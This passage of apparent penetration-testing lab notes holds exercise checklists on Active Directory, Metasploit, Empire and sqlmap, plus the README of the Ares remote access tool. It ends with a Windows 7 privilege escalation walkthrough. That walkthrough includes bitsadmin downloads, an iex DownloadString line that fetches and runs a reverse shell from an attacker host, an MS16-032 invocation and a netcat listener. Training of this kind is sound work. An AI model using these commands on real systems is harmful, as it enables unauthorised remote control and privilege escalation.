depending on where the AD table is stored, you may be able to add a user to the table, which could allow you to psexec in directly to the associated server.<br />☐ Create a silver ticket for the SQL service account.<br /><a href=""><img src="images/1301-3.png" alt="images/1301-3.png" /></a></div><div class='page'><h1 class='title level-4'>21.4.4.1 Exercises</h1><br/>☐ Repeat the exercise of launching Notepad using Excel and DCOM.<br /><a href=""><img src="images/1302-1.png" alt="images/1302-1.png" /></a><br /><a href=""><img src="images/1302-2.png" alt="images/1302-2.png" /></a><br /><a href=""><img src="images/1302-3.png" alt="images/1302-3.png" /></a><br /><a href=""><img src="images/1302-4.png" alt="images/1302-4.png" /></a><br />☐ Improve the attack by replacing the VBA macro with a reverse shell connecting back to Netcat on your windows student VM.<br /><a href=""><img src="images/1302-5.png" alt="images/1302-5.png" /></a><br /><a href=""><img src="images/1302-6.png" alt="images/1302-6.png" /></a><br /><a href=""><img src="images/1302-7.png" alt="images/1302-7.png" /></a><br /><a href=""><img src="images/1302-8.png" alt="images/1302-8.png" /></a><br />☐ Set up a pivoting channel from the domain controller to your Kali machine and obtain a reverse shell.<br /><a href=""><img src="images/1302-9.png" alt="images/1302-9.png" /></a><br /><a href=""><img src="images/1302-10.png" alt="images/1302-10.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>21.5.1.1 Exercises</h1><br/>☐ Repeat the steps shown above to dump the krbtgt password hash and create and use a golden ticket.<br /><a href=""><img src="images/1303-1.png" alt="images/1303-1.png" /></a><br /><a href=""><img src="images/1303-2.png" alt="images/1303-2.png" /></a><br /><a href=""><img src="images/1303-3.png" alt="images/1303-3.png" /></a><br />☐ Why is the password hash for the krbtgt account changed during a functional level upgrade from Windows 2003 to Windows 2008?<br />Prior to 2008, AES was not the standard encryption algorithm. Changing the encryption algorithm changes the hash.</div><div class='page'><h1 class='title level-4'>22.1.3.1 Exercises</h1><br/>☐ Start the postgresql service and launch msfconsole.<br /><a href=""><img src="images/1304-1.png" alt="images/1304-1.png" /></a><br /><a href=""><img src="images/1304-2.png" alt="images/1304-2.png" /></a><br />☐ Use the SMB, HTTP, and any other interesting auxiliary modules to scan the lab systems.<br /><a href=""><img src="images/1304-3.png" alt="images/1304-3.png" /></a><br /><a href=""><img src="images/1304-4.png" alt="images/1304-4.png" /></a><br /><a href=""><img src="images/1304-5.png" alt="images/1304-5.png" /></a><br />☐ Review the hosts’ information in the database.<br /><a href=""><img src="images/1304-6.png" alt="images/1304-6.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>22.2.1.1 Exercise</h1><br/>☐ Exploit SyncBreeze using the existing Metasploit module.<br /><a href=""><img src="images/1305-1.png" alt="images/1305-1.png" /></a><a href=""><img src="images/1305-2.png" alt="images/1305-2.png" /></a></div><div class='page'><h1 class='title level-4'>22.3.3.2 Exercise</h1><br/>☐ Take time to review and experiment with the various payloads available in Metasploit.<br /><a href=""><img src="images/1306-1.png" alt="images/1306-1.png" /></a></div><div class='page'><h1 class='title level-4'>22.3.7.1 Exercises</h1><br/>☐ Create a staged and a non-staged Linux binary payload to use on your Kali system.<br /><a href=""><img src="images/1307-1.png" alt="images/1307-1.png" /></a><br />☐ Setup a Netcat listener and run the non-staged payload. Does it work?<br /><a href=""><img src="images/1307-2.png" alt="images/1307-2.png" /></a><br />Yes<br />☐ Setup a Netcat listener and run the staged payload. Does it work?<br /><a href=""><img src="images/1307-3.png" alt="images/1307-3.png" /></a><br />No<br />☐ Get a Meterpreter shell on your Windows system. Practice file transfers.<br /><a href=""><img src="images/1307-4.png" alt="images/1307-4.png" /></a><br />☐ Inject a payload into plink.exe. Test it on your Windows system.<br /><a href=""><img src="images/1307-5.png" alt="images/1307-5.png" /></a><br /><a href=""><img src="images/1307-6.png" alt="images/1307-6.png" /></a><br /><a href=""><img src="images/1307-7.png" alt="images/1307-7.png" /></a><br />☐ Create an executable file running a Meterpreter payload and execute it on your Windows system.<br /><a href=""><img src="images/1307-8.png" alt="images/1307-8.png" /></a><br /><a href=""><img src="images/1307-9.png" alt="images/1307-9.png" /></a><br /><a href=""><img src="images/1307-10.png" alt="images/1307-10.png" /></a><br />☐ After establishing a Meterpreter connection, setup a new transport type and change to it.<br /><a href=""><img src="images/1307-11.png" alt="images/1307-11.png" /></a><br /><a href=""><img src="images/1307-12.png" alt="images/1307-12.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>22.4.1.1 Exercise</h1><br/>☐ Create a new Metasploit module for your SyncBreeze exploit<br /><a href=""><img src="images/1308-1.png" alt="images/1308-1.png" /></a><br /><a href=""><img src="images/1308-2.png" alt="images/1308-2.png" /></a></div><div class='page'><h1 class='title level-4'>22.5.4.1 Exercise</h1><br/>☐ Use post-exploitation modules and extensions along with pivoting techniques to enumerate and compromise the domain controller from a meterpreter shell obtained from your Windows 10 client.<br /><a href=""><img src="images/1309-1.png" alt="images/1309-1.png" /></a><br /><a href=""><img src="images/1309-2.png" alt="images/1309-2.png" /></a><br /><a href=""><img src="images/1309-3.png" alt="images/1309-3.png" /></a><br /><a href=""><img src="images/1309-4.png" alt="images/1309-4.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>22.6.1.1 Exercise</h1><br/>☐ Create a resource script using both a second stage encoder and autorun scripts and use it with the meterpreter payload.<br /><a href=""><img src="images/1310-1.png" alt="images/1310-1.png" /></a><br /><a href=""><img src="images/1310-2.png" alt="images/1310-2.png" /></a><br /><a href=""><img src="images/1310-3.png" alt="images/1310-3.png" /></a><br /><a href=""><img src="images/1310-4.png" alt="images/1310-4.png" /></a><br /><a href=""><img src="images/1310-5.png" alt="images/1310-5.png" /></a><br /><br /><br /></div><div class='page'><h1 class='title level-4'>23.1.3.1 Exercises</h1><br/>☐ Install and start PowerShell Empire on your Kali system.<br /><a href=""><img src="images/1311-1.png" alt="images/1311-1.png" /></a><br /><a href=""><img src="images/1311-2.png" alt="images/1311-2.png" /></a><br />☐ Create a PowerShell Empire listener on your Kali machine and execute a stager on your Windows 10 client.<br /><a href=""><img src="images/1311-3.png" alt="images/1311-3.png" /></a><br /><a href=""><img src="images/1311-4.png" alt="images/1311-4.png" /></a><br /><a href=""><img src="images/1311-5.png" alt="images/1311-5.png" /></a><br />☐ Experiment with the PowerShell Empire agent and its basic functionality<br /><a href=""><img src="images/1311-6.png" alt="images/1311-6.png" /></a><br /><a href=""><img src="images/1311-7.png" alt="images/1311-7.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>23.3.1.1 Exercises</h1><br/>☐ Set up a PowerShell Empire listener and stager and obtain a working agent.<br /><a href=""><img src="images/1312-1.png" alt="images/1312-1.png" /></a><br />☐ Perform enumeration on the domain using various modules.<br /><a href=""><img src="images/1312-2.png" alt="images/1312-2.png" /></a><br /><a href=""><img src="images/1312-3.png" alt="images/1312-3.png" /></a><br />☐ Perform a remote desktop login with the account Jeff_Admin to ensure the credentials are cached on the Windows 10 client and then dump the credentials using PowerShell Empire.<br /><a href=""><img src="images/1312-4.png" alt="images/1312-4.png" /></a><br /><a href=""><img src="images/1312-5.png" alt="images/1312-5.png" /></a><br />☐ Experiment with the different lateral movement modules.<br /><a href=""><img src="images/1312-6.png" alt="images/1312-6.png" /></a><br /><br /><br /></div><div class='page'><h1 class='title level-4'>24.2.2.2 Exercise</h1><br/>☐ Use sqlmap to exploit the SQL injection and extract the username and password.<br /><a href=""><img src="images/1313-1.png" alt="images/1313-1.png" /></a><br /><a href=""><img src="images/1313-2.png" alt="images/1313-2.png" /></a><br /><a href=""><img src="images/1313-3.png" alt="images/1313-3.png" /></a><br /></div><div class='page'><h1 class='title level-4'>24.5.1.1 Exercises</h1><br/>☐ Modify the original Python exploit and capture the reverse shell.<br /><a href=""><img src="images/1314-1.png" alt="images/1314-1.png" /></a><br /><a href=""><img src="images/1314-2.png" alt="images/1314-2.png" /></a><br /><a href=""><img src="images/1314-3.png" alt="images/1314-3.png" /></a><br /><a href=""><img src="images/1314-4.png" alt="images/1314-4.png" /></a><br /><a href=""><img src="images/1314-5.png" alt="images/1314-5.png" /></a><br /><a href=""><img src="images/1314-6.png" alt="images/1314-6.png" /></a><br /><a href=""><img src="images/1314-7.png" alt="images/1314-7.png" /></a><br /><a href=""><img src="images/1314-8.png" alt="images/1314-8.png" /></a><br />☐ The original UDF exploit is advertised as a privilege escalation exploit. Why are we getting an unprivileged shell?<br />The original UDF exploit assumes that the database is running as root, which it is not.</div><div class='page'><h1 class='title level-2'>Red Vs Blue</h1><br/><br /></div><div class='page'><h1 class='title level-3'>Aires ReadMe</h1><br/><br /><h1>Ares</h1><br />Ares is a Python Remote Access Tool.<br />Warning: Only use this software according to your current  legislation. Misuse of this software can raise legal and ethical issues  which I don&#39;t support nor can be held responsible for.<br />Ares is made of two main programs:<br />• A Command aNd Control server, which is a Web interface to administer the agents<br />• An agent program, which is run on the compromised host, and ensures communication with the CNC<br />The Web interface can be run on any server running Python. The agent can be compiled to native executables using pyinstaller.<br /><br /><h2>Setup</h2><br />Install the Python requirements:<br /><code>pip install -r requirements.txt<br /></code>Initialize the database:<br /><code>cd server<br />./ares.py initdb<br /></code>In order to compile Windows agents on Linux, setup wine (optional):<br /><code>./wine_setup.sh<br /></code><br /><h2>Server</h2><br />Run with the builtin (debug) server:<br /><code>./ares.py runserver -h 0.0.0.0 -p 8080 --threaded<br /></code>Or run using gunicorn:<br /><code>gunicorn ares:app -b 0.0.0.0:8080 --threads 20<br /></code>The server should now be accessible on <a href="http://localhost:8080">http://localhost:8080</a><br /><br /><h2>Agent</h2><br />Run the Python agent (update config.py to suit your needs):<br /><code>cd agent<br />./agent.py<br /></code>Build a new agent to a standalone binary:<br /><code>./builder.py -p Linux --server http://localhost:8080 -o agent<br />./agent<br /></code>To see a list of supported options, run ./builder.py -h<br /><code>./agent/builder.py -h<br />usage: builder.py [-h] -p PLATFORM --server SERVER -o OUTPUT<br />                  [--hello-interval HELLO_INTERVAL] [--idle_time IDLE_TIME]<br />                  [--max_failed_connections MAX_FAILED_CONNECTIONS]<br />                  [--persistent]<br /><br />Builds an Ares agent.<br /><br />optional arguments:<br />  -h, --help            show this help message and exit<br />  -p PLATFORM, --platform PLATFORM<br />                        Target platform (Windows, Linux).<br />  --server SERVER       Address of the CnC server (e.g http://localhost:8080).<br />  -o OUTPUT, --output OUTPUT<br />                        Output file name.<br />  --hello-interval HELLO_INTERVAL<br />                        Delay (in seconds) between each request to the CnC.<br />  --idle_time IDLE_TIME<br />                        Inactivity time (in seconds) after which to go idle.<br />                        In idle mode, the agent pulls commands less often<br />                        (every &lt;hello_interval&gt; seconds).<br />  --max_failed_connections MAX_FAILED_CONNECTIONS<br />                        The agent will self destruct if no contact with the<br />                        CnC can be made &lt;max_failed_connections&gt; times in a<br />                        row.<br />  --persistent          Automatically install the agent on first run.<br /></code><br /><h3>Supported agent commands</h3><br /><code>&lt;any shell command&gt;<br />Executes the command in a shell and return its output.<br /><br />upload &lt;local_file&gt;<br />Uploads &lt;local_file&gt; to server.<br /><br />download &lt;url&gt; &lt;destination&gt;<br />Downloads a file through HTTP(S).<br /><br />zip &lt;archive_name&gt; &lt;folder&gt;<br />Creates a zip archive of the folder.<br /><br />screenshot<br />Takes a screenshot.<br /><br />python &lt;command|file&gt;<br />Runs a Python command or local file.<br /><br />persist<br />Installs the agent.<br /><br />clean<br />Uninstalls the agent.<br /><br />exit<br />Kills the agent.<br /><br />help<br />This help.<br /></code></div><div class='page'><h1 class='title level-3'>Win7 aries Privesc</h1><br/>start ares (reference the sweetsoftware/ares github page)<br />make an agent and save it as a .exe<br />host file and manual download with apache2<br />manuall Set-ExecutionPolicy -ExecutionPolicy Unrestricted###might not be necessary if ran with powershell v1###<br />add Find-AllVulns to the bottom of the hosted Sherlock.ps1<br />bitsadmin /transfer SherlockJob /download <a href="http://192.168.163.165:8080/Sherlock.ps1">http://192.168.163.165:80/Sherlock.ps1</a> C:\Users\larry.dadmin.HECTORLIVES\Desktop\Sherlock.ps1<br />C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe C:\Users\larry.dadmin.HECTORLIVES\Desktop\Sherlock.ps1 &gt;&gt; Sherlock.txt<br />Title      : Secondary Logon Handle<br />MSBulletin : MS16-032<br />CVEID      : 2016-0099<br />Link       : https://www.exploit-db.com/exploits/39719/<br />VulnStatus : Appears Vulnerable<br />add to the bottom of Invoke-MS16032 \/<br />    Invoke-MS16032 -Command “C:\Users\larry.dadmin.HECTORLIVES\Desktop\Invoke-PowerShellTcp.ps1”<br />    or<br />    Invoke-MS16032 -Command &quot;iex(New-Object Net.WebClient).DownloadString(&#39;http://192.168.163.165:80/Invoke-PowerShellTcp.ps1&#39;)&quot;<br />add to the bottom of Invoke-PowershellTCP.ps1 \/<br />    Invoke-PowershellTCP -Reverse -IPAddress 192.168.163.165 -port 3232<br />    <br /><br />bitsadmin /transfer SherlockJob /download <a href="http://192.168.163.165:8080/Sherlock.ps1">http://192.168.163.165:80/</a>Invoke-PowerShellTcp.ps1 C:\Users\larry.dadmin.HECTORLIVES\Desktop\Invoke-PowershellTcp.ps1<br />bitsadmin /transfer SherlockJob /download <a href="http://192.168.163.165:8080/Sherlock.ps1">http://192.168.163.165:80/</a>Invoke-MS16032.ps1 C:\Users\larry.dadmin.HECTORLIVES\Desktop\Invoke-MS16032.ps1<br />in terminal<br />    nc -nlvp 3232<br />in aries<br />    C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe C:\Users\larry.dadmin.HECTORLIVES\Desktop\Invoke-MS16032.ps1<br />in terminal (system shell)<br />    .\WinAgent.exe<br />in aries<br />    Observe and enjoy your system session<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div></body></html>